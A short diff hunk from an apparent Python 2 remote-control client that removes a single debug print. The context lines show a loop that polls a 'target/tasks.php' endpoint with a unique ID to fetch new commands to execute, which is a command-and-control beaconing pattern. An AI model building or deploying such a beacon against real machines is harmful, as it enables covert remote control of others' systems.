@@ -57,8 +57,6 @@ while 1:
 no_response = 0
 while 1:
 
-	print delay
-
 	# Check if there are new commands to execute
 	r = requests.post ('http://' + caesar_folder + '/target/tasks.php', data={'unique_id': unique_id})
 	response = r.text
